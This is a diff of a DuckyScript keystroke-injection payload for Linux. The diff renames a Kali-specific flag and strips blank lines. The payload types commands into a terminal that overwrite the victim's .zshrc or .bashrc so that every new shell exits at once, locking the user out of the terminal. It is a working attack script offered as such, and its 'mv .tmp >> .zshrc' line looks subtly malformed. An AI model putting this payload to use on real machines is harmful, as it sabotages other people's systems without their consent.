@@ -8,14 +8,10 @@ REM # Target       : Linux                                     #
 REM #                                                          #
 REM ############################################################
 
-
 REM Requirements:
 REM     - Nothing <3
-
-
 REM With Kali Linux 2020.4, the new default shell is now ZSH for users who install the distribution.
-DEFINE #ONE_ONLY_IF_YOU_USE_IT_ON_KALI_LINUX TRUE
-
+DEFINE #TARGET_KALI_LINUX TRUE
 
 EXTENSION DETECT_READY
     REM VERSION 1.1
@@ -45,14 +41,11 @@ EXTENSION DETECT_READY
     CAPSLOCK
 END_EXTENSION
 
-
 CTRL-ALT t
 DELAY 2000
-
 STRINGLN echo "exit" > .tmp
 DELAY 500
-
-IF_DEFINED_TRUE #ONE_ONLY_IF_YOU_USE_IT_ON_KALI_LINUX
+IF_DEFINED_TRUE #TARGET_KALI_LINUX
     STRINGLN cat .zshrc >> .tmp
     DELAY 500
     STRINGLN mv .tmp >> .zshrc
@@ -61,7 +54,5 @@ ELSE_DEFINED
     DELAY 500    
     STRINGLN mv .tmp >> .bashrc
 END_IF_DEFINED
-
 DELAY 500
-
 ALT F4
